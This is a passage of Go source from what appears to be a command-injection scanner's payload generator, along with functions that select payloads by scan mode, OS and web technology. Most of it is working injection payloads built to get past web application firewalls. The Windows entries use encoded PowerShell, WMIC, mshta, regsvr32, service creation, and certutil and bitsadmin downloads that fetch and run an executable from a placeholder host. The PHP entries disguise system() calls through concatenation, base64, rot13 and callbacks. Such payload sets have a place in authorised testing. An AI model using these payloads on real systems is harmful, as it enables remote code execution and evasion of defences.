		{Content: "& cm^d /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - cmd部分脱字符", IsHarmless: false},
		{Content: "& %HOMEDRIVE%\\Windows\\System32\\cmd.exe /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - HOMEDRIVE变量", IsHarmless: false},
		{Content: "& powershell -w hidden -c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - PowerShell隐藏窗口", IsHarmless: false},
		{Content: "& powershell -e dwBoAG8AYQBtAGkA", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - PowerShell编码whoami", IsHarmless: false},
		{Content: "& for /r %i in (cmd.exe) do %i /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - for递归查找", IsHarmless: false},
		{Content: "& for /f \"tokens=*\" %i in ('where cmd') do %i /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - where命令", IsHarmless: false},
		{Content: "& set a=dir&&call %%a%%", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - set/call组合", IsHarmless: false},
		{Content: "& set a=whoami&&call %%a%%", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - whoami set/call", IsHarmless: false},
		{Content: "& echo dir|cmd", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - echo管道", IsHarmless: false},
		{Content: "& echo whoami|cmd", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - whoami管道", IsHarmless: false},
		{Content: "& cmd /c echo dir>test.txt&&test.txt", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 写文件执行", IsHarmless: false},
		{Content: "& sc create test binPath= \"cmd /c dir\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - 服务创建", IsHarmless: false},
		{Content: "& wmic process call create \"cmd /c dir\"", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - WMIC执行", IsHarmless: false},
		{Content: "& mshta vbscript:execute(\"dir:close\")", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - MSHTA执行", IsHarmless: false},
		{Content: "& rundll32.exe cmd.dll,Run", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - rundll32", IsHarmless: false},
		{Content: "& regsvr32 /s /n /u scrobj.dll cmd.sct", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - regsvr32", IsHarmless: false},
		{Content: "& certutil -urlcache -f http://x/cmd.exe cmd.exe&&cmd.exe /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - certutil", IsHarmless: false},
		{Content: "& bitsadmin /transfer job /download /priority high http://x/cmd.exe cmd.exe&&cmd.exe /c dir", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeWindows, Description: "WAF绕过 - bitsadmin", IsHarmless: false},
	}

	pg.phpWAFBypassPayloads = []types.Payload{
		{Content: "sYsTeM('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP大小写", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "sys/**/tem('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP注释分割", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "(system)('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP括号", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "define('x','system');x('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP动态函数", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$a='sys';$b='tem';$a.$b('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP字符串拼接", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "call_user_func('system','ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP回调函数", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "array_map('system',array('ls'));", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP array_map", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "assert('system(\"ls\")');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP assert", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "create_function('','system(\"ls\");')();", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP create_function", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "preg_replace('/.*/e','system(\"ls\")','');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP preg_replace", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$_GET[0]($_GET[1]);&0=system&1=ls", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP变量函数", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "var_dump(`ls`);", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP反引号var_dump", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "print `ls`;", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP反引号print", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "die(`ls`);", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP反引号die", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "exit(`ls`);", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP反引号exit", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "echo shell_exec('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP echo执行", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "print shell_exec('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP print执行", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "ob_start('system');echo 'ls';ob_end_flush();", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP ob_start", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$a='sy'.'stem';$a('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP字符串连接", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$a=str_rot13('flfgrz');$a('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP rot13", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$a=base64_decode('c3lzdGVt');$a('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP base64", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$a=strrev('metsyS');$a('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP strrev", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "usort(...$_GET);&1=system&2=ls", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP usort", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "uasort(...$_GET);&1=system&2=ls", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP uasort", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "uksort(...$_GET);&1=system&2=ls", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP uksort", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "array_filter(array('ls'),'system');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP array_filter", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "array_reduce(array('ls'),'system');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP array_reduce", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "array_walk(array('ls'),'system');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP array_walk", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "register_shutdown_function('system','ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP shutdown", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "register_tick_function('system','ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP tick", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "forward_static_call_array('system',array('ls'));", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP forward_static", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "filter_var('ls',FILTER_CALLBACK,array('options'=>'system'));", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP filter_var", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "filter_input(INPUT_GET,'cmd',FILTER_CALLBACK,array('options'=>'system'));", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP filter_input", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "$x='sys'.'tem';($x)('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP动态调用", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP chr拼接", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "eval('?><?php system($_GET[0]);');&0=ls", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP eval短标签", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "${@system('ls')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP Smarty风格", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "{${system('ls')}}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP双花括号", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "${system('ls')}", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP变量解析", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "pcntl_exec('/bin/ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeUnix, Description: "WAF绕过 - PHP pcntl", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "proc_open('ls',array(),$pipes);", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP proc_open", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "popen('ls','r');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP popen", TechType: types.TechTypePHP, IsHarmless: false},
		{Content: "expect_popen('ls');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "WAF绕过 - PHP expect", TechType: types.TechTypePHP, IsHarmless: false},
	}
}

func (pg *PayloadGenerator) GetPayloadsByType(payloadType types.PayloadType) []types.Payload {
	var result []types.Payload
	for _, p := range pg.GetAllPayloads() {
		if p.PayloadType == payloadType {
			result = append(result, p)
		}
	}
	return result
}

func (pg *PayloadGenerator) GetPayloadsByOS(osType types.OSType) []types.Payload {
	var result []types.Payload
	for _, p := range pg.GetAllPayloads() {
		if p.OSType == osType || p.OSType == types.OSTypeBoth {
			result = append(result, p)
		}
	}
	return result
}

func (pg *PayloadGenerator) GetPayloadsByTech(techType types.TechType) []types.Payload {
	var result []types.Payload
	for _, p := range pg.GetAllPayloads() {
		if p.TechType == techType {
			result = append(result, p)
		}
	}
	return result
}

func (pg *PayloadGenerator) GetTimeBasedPayloads() []types.Payload {
	var payloads []types.Payload
	payloads = append(payloads, pg.unixTimePayloads...)
	payloads = append(payloads, pg.windowsTimePayloads...)
	return payloads
}

func (pg *PayloadGenerator) GetEchoBasedPayloads() []types.Payload {
	return pg.GetPayloadsByType(types.PayloadTypeEchoBased)
}

func (pg *PayloadGenerator) GetHarmlessPayloads() []types.Payload {
	return pg.GetTimeBasedPayloads()
}

func (pg *PayloadGenerator) GetEchoPayloads() []types.Payload {
	var payloads []types.Payload
	payloads = append(payloads, pg.unixEchoPayloads...)
	payloads = append(payloads, pg.windowsEchoPayloads...)
	payloads = append(payloads, pg.phpCodeExecPayloads...)
	payloads = append(payloads, pg.jspCodeExecPayloads...)
	payloads = append(payloads, pg.aspCodeExecPayloads...)
	payloads = append(payloads, pg.aspxCodeExecPayloads...)
	payloads = append(payloads, pg.pythonCodeExecPayloads...)
	payloads = append(payloads, pg.nodejsCodeExecPayloads...)
	payloads = append(payloads, pg.rubyCodeExecPayloads...)
	payloads = append(payloads, pg.goCodeExecPayloads...)
	payloads = append(payloads, pg.perlCodeExecPayloads...)
	payloads = append(payloads, pg.luaCodeExecPayloads...)
	payloads = append(payloads, pg.coldfusionCodeExecPayloads...)
	payloads = append(payloads, pg.templatePayloads...)
	
	if len(payloads) == 0 {
		return pg.GetAllPayloads()
	}
	
	return payloads
}

func (pg *PayloadGenerator) GetWAFBypassPayloads() []types.Payload {
	var payloads []types.Payload
	payloads = append(payloads, pg.unixWAFBypassPayloads...)
	payloads = append(payloads, pg.windowsWAFBypassPayloads...)
	payloads = append(payloads, pg.phpWAFBypassPayloads...)
	return payloads
}

func (pg *PayloadGenerator) GetPayloadsByMode(mode types.ScanMode) []types.Payload {
	switch mode {
	case types.ScanModeHarmless:
		return pg.GetHarmlessPayloads()
	case types.ScanModeEcho:
		return pg.GetEchoPayloads()
	case types.ScanModeWAFBypass:
		return pg.GetWAFBypassPayloads()
	default:
		return pg.GetAllPayloads()
	}
}

func (pg *PayloadGenerator) GetPayloadsByModeAndTech(mode types.ScanMode, tech types.TechType) []types.Payload {
	var basePayloads []types.Payload

	switch mode {
	case types.ScanModeHarmless:
		basePayloads = pg.GetHarmlessPayloads()
	case types.ScanModeEcho:
		basePayloads = pg.GetEchoPayloads()
	case types.ScanModeWAFBypass:
		basePayloads = pg.GetWAFBypassPayloads()
	default:
		basePayloads = pg.GetAllPayloads()
	}

	if len(basePayloads) == 0 {
		basePayloads = pg.GetAllPayloads()
	}

	if tech == types.TechTypeUnknown {
		return basePayloads
	}

	var techPayloads []types.Payload
	var priorityPayloads []types.Payload

	switch tech {
	case types.TechTypePHP:
		techPayloads = pg.phpCodeExecPayloads
		priorityPayloads = pg.phpWAFBypassPayloads
	case types.TechTypeJSPJava:
		techPayloads = pg.jspCodeExecPayloads
	case types.TechTypeASP:
		techPayloads = pg.aspCodeExecPayloads
	case types.TechTypeASPXDotNet:
		techPayloads = pg.aspxCodeExecPayloads
	case types.TechTypePython:
		techPayloads = pg.pythonCodeExecPayloads
	case types.TechTypeNodeJS:
		techPayloads = pg.nodejsCodeExecPayloads
	case types.TechTypeRuby:
		techPayloads = pg.rubyCodeExecPayloads
	case types.TechTypeGo:
		techPayloads = pg.goCodeExecPayloads
	case types.TechTypePerl:
		techPayloads = pg.perlCodeExecPayloads
	case types.TechTypeLua:
		techPayloads = pg.luaCodeExecPayloads
	case types.TechTypeColdFusion:
		techPayloads = pg.coldfusionCodeExecPayloads
	case types.TechTypeTemplate:
		techPayloads = pg.templatePayloads
	}

	var result []types.Payload
	result = append(result, priorityPayloads...)
	result = append(result, techPayloads...)

	for _, p := range basePayloads {
		if p.TechType == types.TechTypeUnknown || p.TechType == tech {
			result = append(result, p)
		}
	}

	return pg.removeDuplicates(result)
}

func (pg *PayloadGenerator) GetAllPayloads() []types.Payload {
	var payloads []types.Payload
	payloads = append(payloads, pg.unixTimePayloads...)
	payloads = append(payloads, pg.windowsTimePayloads...)
	payloads = append(payloads, pg.echoTestPayloads...)
	payloads = append(payloads, pg.dnsPayloads...)
	payloads = append(payloads, pg.filePayloads...)
	payloads = append(payloads, pg.unixEchoPayloads...)
	payloads = append(payloads, pg.windowsEchoPayloads...)
	payloads = append(payloads, pg.phpCodeExecPayloads...)
	payloads = append(payloads, pg.jspCodeExecPayloads...)
	payloads = append(payloads, pg.aspCodeExecPayloads...)
	payloads = append(payloads, pg.aspxCodeExecPayloads...)
	payloads = append(payloads, pg.pythonCodeExecPayloads...)
	payloads = append(payloads, pg.nodejsCodeExecPayloads...)
	payloads = append(payloads, pg.rubyCodeExecPayloads...)
	payloads = append(payloads, pg.goCodeExecPayloads...)
	payloads = append(payloads, pg.perlCodeExecPayloads...)
	payloads = append(payloads, pg.luaCodeExecPayloads...)
	payloads = append(payloads, pg.coldfusionCodeExecPayloads...)
	payloads = append(payloads, pg.templatePayloads...)
	payloads = append(payloads, pg.unixWAFBypassPayloads...)
	payloads = append(payloads, pg.windowsWAFBypassPayloads...)
	payloads = append(payloads, pg.phpWAFBypassPayloads...)
	
	if len(payloads) == 0 {
		return []types.Payload{
			{Content: "system('id');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP system() - id", TechType: types.TechTypePHP, ExpectedOutput: "uid="},
			{Content: "system('whoami');", PayloadType: types.PayloadTypeCodeExec, OSType: types.OSTypeBoth, Description: "PHP system() - whoami", TechType: types.TechTypePHP},
			{Content: "id", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeUnix, Description: "Unix id命令"},
			{Content: "whoami", PayloadType: types.PayloadTypeEchoBased, OSType: types.OSTypeBoth, Description: "whoami命令"},
		}
	}
	
	return pg.removeDuplicates(payloads)
}

func (pg *PayloadGenerator) removeDuplicates(payloads []types.Payload) []types.Payload {
	seen := make(map[string]bool)
	var result []types.Payload
	for _, p := range payloads {
		if !seen[p.Content] {
			seen[p.Content] = true
			result = append(result, p)
		}
	}
	return result
}

func (pg *PayloadGenerator) GetTechStatistics() map[string]int {
	return map[string]int{
		"PHP":               len(pg.phpCodeExecPayloads),
		"JSP/Java":          len(pg.jspCodeExecPayloads),
		"ASP":               len(pg.aspCodeExecPayloads),
		"ASPX/.NET":         len(pg.aspxCodeExecPayloads),
		"Python":            len(pg.pythonCodeExecPayloads),
		"Node.js":           len(pg.nodejsCodeExecPayloads),
		"Ruby":              len(pg.rubyCodeExecPayloads),
		"Go":                len(pg.goCodeExecPayloads),
		"Perl":              len(pg.perlCodeExecPayloads),
		"Lua":               len(pg.luaCodeExecPayloads),
		"ColdFusion":        len(pg.coldfusionCodeExecPayloads),
		"Template Injection": len(pg.templatePayloads),
		"WAF Bypass":        len(pg.unixWAFBypassPayloads) + len(pg.windowsWAFBypassPayloads) + len(pg.phpWAFBypassPayloads),
	}
}
